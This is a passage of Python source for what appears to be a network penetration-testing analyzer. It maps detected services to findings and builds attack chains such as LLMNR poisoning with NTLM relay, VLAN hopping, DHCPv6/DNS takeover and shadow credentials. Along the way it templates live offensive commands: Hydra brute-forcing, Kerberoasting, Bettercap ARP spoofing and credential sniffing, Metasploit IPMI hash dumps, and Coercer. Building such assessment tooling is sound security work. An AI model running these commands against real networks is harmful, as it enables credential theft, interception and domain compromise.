        service_names=["litellm", "openwebui", "anythingllm"],
        name="AI Gateway / Platform Exposed",
        severity=Severity.HIGH,
        description=(
            "AI gateway or platform detected. May proxy requests to multiple LLM "
            "providers with stored API keys. Risk of API key exposure and data leakage."
        ),
        tools=[
            ToolRecommendation(name="LiteLLM Health",
                              command="curl -s http://{ip}:4000/health | jq .",
                              description="Check LiteLLM proxy health and connected models"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-029",
        service_names=["triton", "nvidia_nim", "tensorrt_llm", "ray_serve", "bentoml"],
        name="Enterprise ML Inference Server Exposed",
        severity=Severity.HIGH,
        description=(
            "Enterprise ML inference server detected (NVIDIA Triton, NIM, Ray Serve, "
            "or BentoML). Model theft risk — trained models represent significant IP."
        ),
        tools=[
            ToolRecommendation(name="Triton Models",
                              command="curl -s -X POST http://{ip}:8000/v2/repository/index | jq '.[].name'",
                              description="Enumerate deployed models on Triton"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-018",
        service_names=["ldap"],
        name="LDAP Service Detected — Relay Target",
        severity=Severity.HIGH,
        description=(
            "LDAP directory service detected. LDAP is a high-value NTLM relay target — "
            "relaying to LDAP allows AD object modification, RBCD delegation, and shadow "
            "credentials attacks. Validate channel binding enforcement with RelayKing."
        ),
        tools=[
            ToolRecommendation(name="RelayKing", command="relayking -tf targets.txt -o relay_targets.json",
                              description="Check LDAP channel binding and signing requirements",
                              url="https://github.com/depthsecurity/RelayKing-Depth"),
            ToolRecommendation(name="ldapsearch", command="ldapsearch -x -H ldap://{ip}:{port} -b '' -s base namingContexts",
                              description="Test anonymous LDAP bind and enumerate naming contexts",
                              install_hint="apt install ldap-utils"),
            ToolRecommendation(name="NetExec LDAP", command="nxc ldap {ip} -u '' -p '' --port {port}",
                              description="LDAP enumeration with null credentials",
                              url="https://github.com/Pennyw0rth/NetExec"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-019",
        service_names=["kerberos"],
        name="Kerberos Service Detected — Domain Controller",
        severity=Severity.HIGH,
        description=(
            "Kerberos authentication service detected, indicating an Active Directory "
            "domain controller. This is a high-value target — enumerate accounts that "
            "don't require pre-authentication and service accounts with SPNs."
        ),
        tools=[
            ToolRecommendation(name="GetNPUsers (AS-REP Roasting)",
                              command="GetNPUsers.py {domain}/ -dc-ip {ip} -no-pass -usersfile users.txt",
                              description="Find accounts without Kerberos pre-authentication — no credentials needed",
                              install_hint="pip install impacket"),
            ToolRecommendation(name="GetUserSPNs (Kerberoasting)",
                              command="GetUserSPNs.py {domain}/<user>:<pass> -dc-ip {ip} -request",
                              description="Request service tickets for service accounts with SPNs",
                              install_hint="pip install impacket"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-020",
        service_names=["docker_api", "docker"],
        name="Docker API Detected",
        severity=Severity.CRITICAL,
        description=(
            "Docker API detected. Unauthenticated Docker APIs allow full container "
            "management and host escape via privileged containers."
        ),
        tools=[
            ToolRecommendation(name="Docker API Check",
                              command="curl -s http://{ip}:{port}/containers/json | python3 -m json.tool",
                              description="List containers via unauthenticated Docker API"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-021",
        service_names=["kubernetes_api", "kubernetes"],
        name="Kubernetes API Detected",
        severity=Severity.CRITICAL,
        description="Kubernetes API server detected. Test for unauthenticated access and RBAC misconfigurations.",
        tools=[
            ToolRecommendation(name="kubectl",
                              command="kubectl --server=https://{ip}:{port} --insecure-skip-tls-verify get pods --all-namespaces",
                              description="Test unauthenticated Kubernetes API access"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-023",
        service_names=["imap", "pop3"],
        name="IMAP/POP3 Service Detected — Cleartext Mail",
        severity=Severity.MEDIUM,
        description=(
            "Mail retrieval service detected. IMAP/POP3 without STARTTLS transmit "
            "credentials and email content in cleartext. Passively capture mail "
            "credentials via MITM positioning."
        ),
        tools=[
            ToolRecommendation(name="Nmap Mail Scripts", command="nmap -sV -p {port} --script=imap-capabilities,pop3-capabilities {ip}",
                              description="Enumerate mail server capabilities and check if STARTTLS is supported",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="Bettercap (Mail Sniff)", command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
                              description="Passively capture mail credentials via MITM — cleartext protocols leak credentials",
                              url="https://github.com/bettercap/bettercap"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-005",
        service_names=["ssh"],
        name="SSH Service Detected",
        severity=Severity.MEDIUM,
        description=(
            "SSH service detected. While SSH is encrypted, weak configurations allow "
            "password brute-forcing, and older versions may be vulnerable to known exploits. "
            "Enumerate supported authentication methods and check for weak keys."
        ),
        tools=[
            ToolRecommendation(name="Nmap SSH Scripts", command="nmap -sV -p {port} --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods {ip}",
                              description="Enumerate SSH algorithms, host keys, and authentication methods",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="ssh-audit", command="ssh-audit {ip}:{port}",
                              description="Comprehensive SSH server audit — algorithms, vulnerabilities, and hardening recommendations",
                              url="https://github.com/jtesta/ssh-audit",
                              install_hint="pip install ssh-audit"),
            ToolRecommendation(name="NetExec SSH", command="nxc ssh {ip} -u users.txt -p passwords.txt --no-bruteforce",
                              description="SSH password spraying with user:password pairs",
                              url="https://github.com/Pennyw0rth/NetExec",
                              install_hint="pip install netexec"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-006",
        service_names=["rdp", "ms-wbt-server"],
        name="RDP Service Detected",
        severity=Severity.HIGH,
        description=(
            "Remote Desktop Protocol service detected. RDP is a high-value target — "
            "check for NLA (Network Level Authentication) enforcement, BlueKeep and related "
            "vulnerabilities, and test for weak credentials."
        ),
        tools=[
            ToolRecommendation(name="Nmap RDP Scripts", command="nmap -sV -p {port} --script=rdp-enum-encryption,rdp-ntlm-info {ip}",
                              description="Enumerate RDP encryption level, NLA support, and NTLM info (domain, hostname)",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="NetExec RDP", command="nxc rdp {ip} -u users.txt -p passwords.txt",
                              description="RDP credential testing and brute-forcing",
                              url="https://github.com/Pennyw0rth/NetExec",
                              install_hint="pip install netexec"),
            ToolRecommendation(name="xfreerdp", command="xfreerdp /v:{ip}:{port} /cert:ignore /u:<user> /p:<pass>",
                              description="Connect to RDP for manual verification",
                              install_hint="apt install freerdp2-x11"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-007",
        service_names=["mssql", "ms-sql-s"],
        name="Microsoft SQL Server Detected",
        severity=Severity.HIGH,
        description=(
            "MSSQL database server detected. Test for default SA credentials, weak "
            "passwords, and xp_cmdshell availability for command execution. "
            "MSSQL often has high-privilege service accounts useful for lateral movement."
        ),
        tools=[
            ToolRecommendation(name="NetExec MSSQL", command="nxc mssql {ip} -u sa -p '' --local-auth",
                              description="Test MSSQL with default SA account (blank password)",
                              url="https://github.com/Pennyw0rth/NetExec",
                              install_hint="pip install netexec"),
            ToolRecommendation(name="Nmap MSSQL Scripts", command="nmap -sV -p {port} --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password {ip}",
                              description="Enumerate MSSQL version, NTLM info, and test empty SA password",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="Impacket mssqlclient", command="mssqlclient.py sa@{ip} -windows-auth",
                              description="Interactive MSSQL shell for xp_cmdshell, linked servers, and credential extraction",
                              install_hint="pip install impacket"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-008",
        service_names=["mysql", "mariadb", "postgresql", "postgres"],
        name="Database Service Detected",
        severity=Severity.HIGH,
        description=(
            "Database service detected. Test for anonymous/default credentials, "
            "excessive privileges, and UDF (User Defined Function) command execution. "
            "Databases often contain sensitive data and credentials for other services."
        ),
        tools=[
            ToolRecommendation(name="Nmap DB Scripts", command="nmap -sV -p {port} --script=mysql-info,mysql-empty-password,pgsql-brute {ip}",
                              description="Enumerate database version and test for empty/default credentials",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="Hydra", command="hydra -l root -P /usr/share/wordlists/rockyou.txt {ip} mysql -s {port}",
                              description="Brute-force database credentials",
                              install_hint="apt install hydra"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-030",
        service_names=["ipmi", "bmc"],
        name="IPMI/BMC Service Detected",
        severity=Severity.CRITICAL,
        description=(
            "IPMI (Intelligent Platform Management Interface) detected. IPMI 2.0 has a "
            "known vulnerability that allows retrieval of password hashes for any valid user "
            "without authentication. BMC often has default credentials (ADMIN/ADMIN)."
        ),
        tools=[
            ToolRecommendation(name="Nmap IPMI", command="nmap -sU -p 623 --script=ipmi-version,ipmi-cipher-zero {ip}",
                              description="Check IPMI version and test for cipher zero vulnerability",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="Metasploit IPMI Hash Dump",
                              command="msfconsole -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {ip}; run'",
                              description="Dump IPMI 2.0 RAKP password hashes without authentication"),
            ToolRecommendation(name="ipmitool", command="ipmitool -I lanplus -H {ip} -U ADMIN -P ADMIN chassis status",
                              description="Test IPMI with common default credentials",
                              install_hint="apt install ipmitool"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-031",
        service_names=["vnc"],
        name="VNC Service Detected",
        severity=Severity.HIGH,
        description=(
            "VNC remote desktop service detected. VNC often uses weak password-only "
            "authentication with no account lockout. Some versions have no authentication "
            "at all. VNC passwords are limited to 8 characters, making brute-forcing fast."
        ),
        tools=[
            ToolRecommendation(name="Nmap VNC Scripts", command="nmap -sV -p {port} --script=vnc-info,vnc-brute {ip}",
                              description="Enumerate VNC version and test for no-auth or weak passwords",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="Hydra VNC", command="hydra -P /usr/share/wordlists/rockyou.txt {ip} vnc -s {port}",
                              description="Brute-force VNC password (max 8 chars, no username required)",
                              install_hint="apt install hydra"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-032",
        service_names=["winrm", "wsman"],
        name="WinRM Service Detected",
        severity=Severity.HIGH,
        description=(
            "Windows Remote Management service detected. WinRM provides PowerShell "
            "remoting and command execution. Test for default/weak credentials — "
            "authenticated WinRM access provides full command execution on the host."
        ),
        tools=[
            ToolRecommendation(name="NetExec WinRM", command="nxc winrm {ip} -u users.txt -p passwords.txt",
                              description="WinRM credential testing and command execution",
                              url="https://github.com/Pennyw0rth/NetExec",
                              install_hint="pip install netexec"),
            ToolRecommendation(name="evil-winrm", command="evil-winrm -i {ip} -u <user> -p <pass>",
                              description="Interactive WinRM shell with PowerShell and file transfer capabilities",
                              url="https://github.com/Hackplayers/evil-winrm",
                              install_hint="gem install evil-winrm"),
        ],
    ),
]


def _hydrate_tools(templates: list[ToolRecommendation], ctx: AnalysisContext,
                    affected: list[dict] | None = None) -> list[ToolRecommendation]:
    """Substitute placeholders in tool commands with actual values.

    Works for passive rules, service rules, and chain tools.
    """
    first = (affected[0] if affected else {}) if affected is not None else {}
    ip = first.get("ip") or "<target_ip>"
    port = str(first.get("port") or "<port>")

    replacements = {
        "{ip}": str(ip),
        "{target_ip}": str(ip),
        "{port}": port,
        "{interface}": ctx.interface or "eth0",
        "{gateway_ip}": ctx.gateway_ip or "<gateway_ip>",
        "{domain}": ctx.domain or "<domain>",
        "{attacker_ip}": ctx.attacker_ip or "<attacker_ip>",
        "{dc_ip}": ctx.dc_ip or "<dc_ip>",
    }

    result = []
    for t in templates:
        cmd = t.command
        for placeholder, value in replacements.items():
            cmd = cmd.replace(placeholder, value)
        result.append(ToolRecommendation(
            name=t.name, command=cmd, description=t.description,
            url=t.url, install_hint=t.install_hint,
        ))
    return result


class ServiceExploitEvaluator:
    """Evaluate all service exploitation rules against probe results."""

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        findings: list[Finding] = []
        for rule in SERVICE_RULES:
            affected: list[dict] = []
            for svc_name in rule.service_names:
                for probe in ctx.probe_by_service.get(svc_name, []):
                    result = json.loads(probe["result"]) if isinstance(probe.get("result"), str) else {}
                    mac = probe["mac"]
                    dev = ctx.device_map.get(mac)
                    affected.append({
                        **((_device_info(dev) if dev else {"mac": mac})),
                        "port": probe.get("port"),
                        "service_version": result.get("version"),
                        "banner": (result.get("banner") or "")[:200],
                    })
            if not affected:
                continue
            tools = _hydrate_tools(rule.tools, ctx, affected)
            findings.append(Finding(
                rule_id=rule.rule_id,
                name=rule.name,
                category=Category.SERVICE_EXPLOIT,
                severity=rule.severity,
                description=rule.description,
                affected_devices=affected,
                evidence=[f"{len(affected)} instance(s) of {', '.join(rule.service_names)}"],
                tools=tools,
            ))
        return findings


# Attack chain builder

CHAIN_DEFINITIONS: list[dict] = [
    {
        "chain_id": "CHAIN-001",
        "name": "LLMNR/NBT-NS Poisoning -> NTLMv2 Relay",
        "description": (
            "Poison name resolution queries to intercept NTLMv2 authentication attempts, "
            "then relay them in real-time to SMB, LDAP, or HTTP services for authenticated "
            "access. Validate targets with RelayKing first. Use Coercer to force authentication "
            "instead of waiting passively."
        ),
        "severity": Severity.CRITICAL,
        "prerequisite_rules": ["NR-001", "NR-002"],
        "match_mode": "any",
        "steps": [
            {"order": 1, "description": "Run RelayKing to identify which hosts have SMB signing disabled or LDAP channel binding unenforced"},
            {"order": 2, "description": "Start Responder or Pretender to poison LLMNR/NBT-NS queries on the local subnet"},
            {"order": 3, "description": "Run ntlmrelayx targeting validated relay hosts from RelayKing output"},
            {"order": 4, "description": "Optionally use Coercer to force specific machines to authenticate immediately"},
        ],
        "tools": [
            ToolRecommendation(
                name="RelayKing",
                command="relayking -tf targets.txt -o relay_targets.json",
                description="Pre-validate which hosts are relay-able (SMB signing, LDAP binding, EPA)",
                url="https://github.com/depthsecurity/RelayKing-Depth",
            ),
            ToolRecommendation(
                name="Responder + ntlmrelayx",
                command="responder -I {interface} -rdwv & ntlmrelayx.py -tf relay_targets.json -smb2support",
                description="Poison name resolution and relay captured NTLMv2 to validated targets",
                install_hint="pip install impacket",
            ),
            ToolRecommendation(
                name="Coercer",
                command="coercer coerce -l {attacker_ip} -t {target_ip} -d {domain} --always-continue",
                description="Force target machines to authenticate via PetitPotam, PrinterBug, DFSCoerce, etc.",
                url="https://github.com/p0dalirius/Coercer",
                install_hint="pip install coercer",
            ),
        ],
    },
    {
        "chain_id": "CHAIN-002",
        "name": "DTP Trunk Negotiation -> VLAN Hopping -> Cross-Segment Access",
        "description": (
            "Negotiate a trunk port via DTP to gain access to all VLANs on the switch. "
            "Once trunked, use 802.1Q tagging to send and receive traffic on any VLAN, "
            "bypassing network segmentation entirely."
        ),
        "severity": Severity.CRITICAL,
        "prerequisite_rules": ["L2-007", "L2-008"],
        "match_mode": "any",
        "steps": [
            {"order": 1, "description": "Use Yersinia to send DTP frames and negotiate trunk mode on the switch port"},
            {"order": 2, "description": "Create 802.1Q sub-interfaces for target VLANs (modprobe 8021q; vconfig add)"},
            {"order": 3, "description": "Scan target VLAN subnets from the newly accessible segments"},
            {"order": 4, "description": "Pivot to high-value targets on previously isolated VLANs"},
        ],
        "tools": [
            ToolRecommendation(
                name="Yersinia (DTP Trunk)",
                command="yersinia dtp -attack 1 -interface {interface}",
                description="Negotiate DTP trunk to enable VLAN hopping",
                url="https://github.com/tomac/yersinia",
                install_hint="apt install yersinia",
            ),
            ToolRecommendation(
                name="VLAN Sub-Interface",
                command="modprobe 8021q && vconfig add {interface} <vlan_id> && ifconfig {interface}.<vlan_id> up && dhclient {interface}.<vlan_id>",
                description="Create 802.1Q sub-interface to access target VLAN",
            ),
            ToolRecommendation(
                name="Nmap VLAN Scan",
                command="nmap -sn -e {interface}.<vlan_id> <target_subnet>/24",
                description="Discover hosts on the newly accessible VLAN",
                install_hint="apt install nmap",
            ),
        ],
    },
    {
        "chain_id": "CHAIN-003",
        "name": "Rogue DHCP -> DNS Poisoning -> Traffic Interception",
        "description": (
            "Deploy a rogue DHCP server to assign attacker-controlled DNS, then "
            "poison DNS responses to redirect all traffic."
        ),
        "severity": Severity.CRITICAL,
        "prerequisite_rules": ["DH-001", "NR-004"],
        "match_mode": "any",
        "steps": [
            {"order": 1, "description": "Deploy rogue DHCP server to assign attacker as DNS/gateway"},
            {"order": 2, "description": "Respond to DNS queries with spoofed addresses"},
            {"order": 3, "description": "Intercept all client traffic through attacker machine"},
        ],
        "tools": [
            ToolRecommendation(
                name="Bettercap (DNS Spoof)",
                command="bettercap -iface {interface} -eval 'set dns.spoof.domains *; set dns.spoof.address {attacker_ip}; dns.spoof on; set dhcp6.spoof.domains *; dhcp6.spoof on'",
                description="Combined DHCPv6 spoofing + DNS spoofing to redirect traffic",
                url="https://github.com/bettercap/bettercap",
            ),
        ],
    },
    {
        "chain_id": "CHAIN-004",
        "name": "IPv6 Rogue RA -> MITM via mitm6",
        "description": (
            "Send rogue Router Advertisements to become the default IPv6 gateway and "
            "DNS server, intercepting traffic even on IPv4-primary networks."
        ),
        "severity": Severity.HIGH,
        "prerequisite_rules": ["RT-001"],
        "match_mode": "any",
        "steps": [
            {"order": 1, "description": "Send rogue Router Advertisements to claim default gateway"},
            {"order": 2, "description": "Serve as DHCPv6 DNS server, respond with attacker IP"},
            {"order": 3, "description": "Intercept and relay authentication (NTLM relay via ntlmrelayx)"},
        ],
        "tools": [
            ToolRecommendation(
                name="mitm6 + ntlmrelayx",
                command="mitm6 -d {domain} -i {interface} & ntlmrelayx.py -tf targets.txt -smb2support -wh {attacker_ip}",
                description="Combined IPv6 MITM + NTLM relay attack",
                install_hint="pip install mitm6 impacket",
            ),
        ],
    },
    {
        "chain_id": "CHAIN-005",
        "name": "ICS/SCADA Reconnaissance -> Protocol Exploitation",
        "description": (
            "Enumerate industrial control system devices and protocols, then assess "
            "read/write capabilities on process control registers."
        ),
        "severity": Severity.CRITICAL,
        "prerequisite_rules": ["SE-009", "SE-010", "SE-011", "SE-012"],
        "match_mode": "any",
        "steps": [
            {"order": 1, "description": "Enumerate ICS devices and identify protocol versions"},
            {"order": 2, "description": "Read registers/coils to understand process variables"},
            {"order": 3, "description": "Assess write capability and document safety implications"},
        ],
        "tools": [],
    },
    {
        "chain_id": "CHAIN-006",
        "name": "SMB Relay -> Domain Compromise",
        "description": (
            "Capture NTLMv2 hashes via name resolution poisoning, then relay them to "
            "SMB services for authenticated command execution. Use RelayKing to validate "
            "targets and Coercer to force authentication."
        ),
        "severity": Severity.CRITICAL,
        "prerequisite_rules": ["NR-001", "SE-003"],
        "match_mode": "all",
        "steps": [
            {"order": 1, "description": "Run RelayKing to validate which SMB targets have signing disabled"},
            {"order": 2, "description": "Start Responder to capture NTLMv2 authentication attempts"},
            {"order": 3, "description": "Relay captured authentication to validated SMB targets with ntlmrelayx"},
            {"order": 4, "description": "Use Coercer to force specific machines to authenticate for immediate relay"},
        ],
        "tools": [
            ToolRecommendation(
                name="RelayKing",
                command="relayking -tf targets.txt -o relay_targets.json",
                description="Validate which SMB hosts have signing disabled and are relay-able",
                url="https://github.com/depthsecurity/RelayKing-Depth",
            ),
            ToolRecommendation(
                name="ntlmrelayx",
                command="ntlmrelayx.py -tf relay_targets.json -smb2support",
                description="Relay captured NTLM authentication to validated SMB targets",
                install_hint="pip install impacket",
            ),
            ToolRecommendation(
                name="Coercer",
                command="coercer coerce -l {attacker_ip} -t {target_ip} -d {domain} --always-continue",
                description="Force target to authenticate via PetitPotam, PrinterBug, DFSCoerce",
                url="https://github.com/p0dalirius/Coercer",
                install_hint="pip install coercer",
            ),
        ],
    },
    {
        "chain_id": "CHAIN-007",
        "name": "DHCPv6 Spoofing -> DNS Takeover -> NTLM Relay",
        "description": (
            "Respond as a rogue DHCPv6 server to become the DNS server for the segment. "
            "Answer DNS/WPAD queries with attacker IP to capture NTLMv2 authentication, "
            "then relay to SMB/LDAP/ADCS targets."
        ),
        "severity": Severity.CRITICAL,
        "prerequisite_rules": ["DH-004", "NR-004"],
        "match_mode": "any",
        "steps": [
            {"order": 1, "description": "Run RelayKing to identify relay-able targets"},
            {"order": 2, "description": "Start mitm6 or Pretender to become DHCPv6 DNS server"},
            {"order": 3, "description": "Captured WPAD/DNS auth relayed via ntlmrelayx to validated targets"},
        ],
        "tools": [
            ToolRecommendation(
                name="mitm6 + ntlmrelayx",
                command="mitm6 -d {domain} -i {interface} & ntlmrelayx.py -tf targets.txt -smb2support -wh {attacker_ip}",
                description="DHCPv6 DNS takeover + NTLM relay — captures and relays auth from WPAD",
            ),
            ToolRecommendation(
                name="Pretender + ntlmrelayx",
                command="pretender -i {interface} -d {domain} --dhcpv6 & ntlmrelayx.py -tf targets.txt -smb2support",
                description="Modern alternative using Pretender for DHCPv6 + name resolution poisoning",
                url="https://github.com/RedTeamPentesting/pretender",
            ),
        ],
    },
    {
        "chain_id": "CHAIN-008",
        "name": "ARP MITM -> Cleartext Credential Harvest",
        "description": (
            "Use ARP cache poisoning to position as man-in-the-middle, then passively "
            "capture credentials from cleartext protocols (Telnet, FTP, SNMP, IMAP/POP3) "
            "without any brute-forcing."
        ),
        "severity": Severity.HIGH,
        "prerequisite_rules": ["L2-001", "SE-001", "SE-002", "SE-004", "SE-023"],
        "match_mode": "custom",
        "steps": [
            {"order": 1, "description": "ARP spoof between target and gateway with Bettercap"},
            {"order": 2, "description": "Passively capture cleartext credentials from observed protocols"},
            {"order": 3, "description": "Use Impacket sniff.py for targeted protocol capture if needed"},
        ],
        "tools": [
            ToolRecommendation(
                name="Bettercap (ARP + Sniff)",
                command="bettercap -iface {interface} -eval 'set arp.spoof.targets {target_ip}; set arp.spoof.fullduplex true; arp.spoof on; set net.sniff.verbose true; net.sniff on'",
                description="Combined ARP spoofing + traffic sniffing — cleartext credentials appear automatically",
                url="https://github.com/bettercap/bettercap",
            ),
        ],
    },
    {
        "chain_id": "CHAIN-009",
        "name": "Name Resolution Poisoning -> Coerced Auth -> Shadow Credentials",
        "description": (
            "Poison name resolution to position for relay, use Coercer to force machine "
            "authentication, relay to LDAP with shadow credentials for persistent domain access."
        ),
        "severity": Severity.CRITICAL,
        "prerequisite_rules": ["NR-001", "SE-018"],
        "match_mode": "all",
        "steps": [
            {"order": 1, "description": "Run RelayKing to validate LDAP relay viability on the DC"},
            {"order": 2, "description": "Start Responder to poison LLMNR/NBT-NS queries"},
            {"order": 3, "description": "Use Coercer to force a target machine to authenticate to attacker"},
            {"order": 4, "description": "Relay authentication to LDAP with shadow credentials via ntlmrelayx"},
        ],
        "tools": [
            ToolRecommendation(
                name="Responder",
                command="responder -I {interface} -rdwv",
                description="Poison LLMNR/NBT-NS to intercept authentication",
                url="https://github.com/lgandx/Responder",
            ),
            ToolRecommendation(
                name="Coercer",
                command="coercer coerce -l {attacker_ip} -t {target_ip} -d {domain} --always-continue",
                description="Force target to authenticate via PetitPotam, PrinterBug, DFSCoerce",
                url="https://github.com/p0dalirius/Coercer",
            ),
            ToolRecommendation(
                name="ntlmrelayx (Shadow Creds)",
                command="ntlmrelayx.py -t ldap://{dc_ip} --shadow-credentials --shadow-target '{target_ip}$'",
                description="Relay to LDAP and set shadow credentials for persistent access",
                install_hint="pip install impacket",
            ),
        ],
    },
    {
        "chain_id": "CHAIN-010",
        "name": "STP Root Bridge Takeover -> Full Segment MITM",
        "description": (
            "If managed switches are detected without BPDU Guard, inject superior BPDU "
            "frames to become the STP root bridge. All Layer 2 traffic on the segment "
            "then flows through the attacker."
        ),
        "severity": Severity.HIGH,
        "prerequisite_rules": ["L2-006"],
        "match_mode": "any",
        "steps": [
            {"order": 1, "description": "Use Yersinia to inject superior BPDUs and claim root bridge"},
            {"order": 2, "description": "All L2 forwarding paths recalculate through attacker"},
            {"order": 3, "description": "Sniff all traffic with Bettercap or tcpdump"},
        ],
        "tools": [
            ToolRecommendation(
                name="Yersinia (STP Root Bridge)",
                command="yersinia stp -attack 4 -interface {interface}",
                description="Claim STP root bridge — all L2 traffic flows through attacker",
                install_hint="apt install yersinia",
            ),
            ToolRecommendation(
                name="Bettercap (Sniff)",
                command="bettercap -iface {interface} -eval 'set net.sniff.verbose true; net.sniff on'",
                description="Passively capture all redirected traffic",
                url="https://github.com/bettercap/bettercap",
            ),
        ],
    },
]


def build_chains(findings: list[Finding], ctx: AnalysisContext | None = None) -> list[AttackChain]:
    """Build attack chains from findings that match prerequisites."""
    finding_ids = {f.rule_id for f in findings}
    finding_map = {f.rule_id: f for f in findings}
    chains: list[AttackChain] = []

    interface = ctx.interface if ctx else "eth0"

    for defn in CHAIN_DEFINITIONS:
        prereqs = set(defn["prerequisite_rules"])
        mode = defn.get("match_mode", "any")

        if mode == "any":
            matched = bool(prereqs & finding_ids)
        elif mode == "custom":
            # First prereq is required, plus at least one of the remaining
            first_prereq = defn["prerequisite_rules"][0]
            if first_prereq not in finding_ids:
                continue
            others = prereqs - {first_prereq}
            matched = bool(others & finding_ids)
        else:
            matched = prereqs.issubset(finding_ids)

        if not matched:
            continue

        # Collect evidence from the findings that triggered this chain
        triggered_by: list[dict] = []
        for rule_id in defn["prerequisite_rules"]:
            f = finding_map.get(rule_id)
            if f is not None:
                triggered_by.append({
                    "rule_id": f.rule_id,
                    "name": f.name,
                    "severity": f.severity,
                    "evidence": f.evidence,
                    "affected_devices": f.affected_devices,
                })

        # Hydrate chain tool placeholders with network context
        chain_tools = defn.get("tools", [])
        if ctx and chain_tools:
            # Collect affected devices from triggered findings for {ip} hydration
            chain_affected = []
            for tb in triggered_by:
                chain_affected.extend(tb.get("affected_devices", []))
            chain_tools = _hydrate_tools(chain_tools, ctx, chain_affected or None)

        chain = AttackChain(
            chain_id=defn["chain_id"],
            name=defn["name"],
            description=defn.get("description", ""),
            severity=defn["severity"],
            steps=defn.get("steps", []),
            prerequisite_findings=defn["prerequisite_rules"],
            tools=chain_tools,
            interface=interface,
            triggered_by=triggered_by,
        )

        # Tag participating findings
        for f in findings:
            if f.rule_id in prereqs:
                if chain.chain_id not in f.chain_ids:
                    f.chain_ids.append(chain.chain_id)

        chains.append(chain)

    return chains


# ── Credential and IoT risk rules ─────────────────────────────────


class UnencryptedProtocolRule:
    """Flag devices using cleartext protocols that expose credentials."""
    rule_id = "CRED-001"
    name = "Unencrypted Protocol Detected"
    category = Category.SERVICE_EXPLOIT
    severity = Severity.HIGH

    _CLEARTEXT_PORTS = {21: "FTP", 23: "Telnet", 110: "POP3", 143: "IMAP", 161: "SNMP"}

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        affected: list[dict] = []
        seen: set[tuple[str, int]] = set()
        for obs_list in ctx.observations_by_mac.values():
            for obs in obs_list:
                raw = _parse_raw_data(obs)
                dst_port = raw.get("dst_port")
                if dst_port in self._CLEARTEXT_PORTS:
                    mac = obs.device_mac
                    key = (mac, dst_port)
                    if key in seen:
                        continue
                    seen.add(key)
                    dev = ctx.device_map.get(mac)
                    proto_name = self._CLEARTEXT_PORTS[dst_port]
                    affected.append({
                        **((_device_info(dev) if dev else {"mac": mac})),
                        "port": dst_port,
                        "protocol": proto_name,
                    })
        if not affected:
            return []
        protos = sorted({a["protocol"] for a in affected})
        return [Finding(
            rule_id=self.rule_id, name=self.name,
            category=self.category, severity=self.severity,
            description=(
                f"Cleartext protocols detected: {', '.join(protos)}. "
                "Credentials transmitted over these protocols can be captured with "
                "passive sniffing. Migrate to encrypted alternatives (SFTP, SSH, IMAPS, etc.)."
            ),
            affected_devices=affected,
            evidence=[f"{len(affected)} device(s) using cleartext protocols: {', '.join(protos)}"],
            tools=[
                ToolRecommendation("Wireshark", "wireshark -i {interface} -f 'port 21 or port 23 or port 110 or port 143'",
                                   "Capture cleartext credentials in transit"),
                ToolRecommendation("Bettercap (Credential Sniff)",
                                   "bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.verbose true; net.sniff on'",
                                   "ARP spoof target and sniff cleartext credentials",
                                   url="https://github.com/bettercap/bettercap"),
            ],
        )]


class IoTDefaultCredentialRiskRule:
    """Flag IoT devices that commonly ship with default or weak credentials."""
    rule_id = "CRED-002"
    name = "IoT Default Credential Risk"
    category = Category.SERVICE_EXPLOIT
    severity = Severity.MEDIUM

    _RISKY_TYPES = {
        "ip_camera": "IP cameras frequently have admin/admin or similar defaults",
        "camera": "Cameras often have vendor default credentials",
        "doorbell": "Smart doorbells may have default cloud credentials",
        "smart_home": "Smart home hubs often have weak default passwords",
        "thermostat": "Smart thermostats may expose APIs without authentication",
        "smart_plug": "Smart plugs often have no authentication on local API",
        "smart_lock": "Smart locks with default codes are a physical security risk",
        "printer": "Network printers frequently have default admin credentials",
        "microcontroller": "Microcontrollers often have debug interfaces exposed",
        "plc": "PLCs commonly use default credentials (Modbus has no auth)",
        "hmi": "HMI panels often have default passwords",
        "robot_vacuum": "Robot vacuums may expose local API without authentication",
    }

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        affected: list[dict] = []
        for mac, dev in ctx.device_map.items():
            dtype = (dev.device_type or "").lower().replace(" ", "_")
            if dtype in self._RISKY_TYPES:
                affected.append({
                    **_device_info(dev),
                    "risk_reason": self._RISKY_TYPES[dtype],
                })
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id, name=self.name,
            category=self.category, severity=self.severity,
            description=(
                f"{len(affected)} IoT device(s) detected that commonly ship with default "
                "or weak credentials. These devices should be audited for credential "
                "changes and firmware updates."
            ),
            affected_devices=affected,
            evidence=[f"{len(affected)} IoT/embedded device(s) with default credential risk"],
            tools=[
                ToolRecommendation("Nmap", "nmap -sV --script=default -p 80,443,8080,23,22",
                                   "Scan for open management interfaces"),
                ToolRecommendation("Hydra", "hydra -L users.txt -P passwords.txt <ip> http-get",
                                   "Brute-force default credentials"),
            ],
        )]


class MultiSubnetDeviceRule:
